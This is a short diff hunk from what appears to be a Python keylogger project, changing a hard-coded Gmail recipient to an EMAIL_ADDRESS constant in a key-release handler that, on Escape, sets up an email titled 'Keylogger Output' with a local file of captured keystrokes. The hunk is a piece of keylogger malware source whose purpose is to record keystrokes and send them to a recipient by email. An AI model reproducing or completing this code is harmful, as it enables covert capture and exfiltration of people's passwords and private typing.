@@ -40,7 +40,7 @@ def write_file(keys):
 
 def on_release(key):
     if key == Key.esc:  # Escape to exit
-        sendto = '126330392k@gmail.com'
+        sendto = EMAIL_ADDRESS
         subject = 'Keylogger Output'
 
         file_location = "C:\\Users\GGPC\Documents\GitHub\KeyLogger\output.txt"
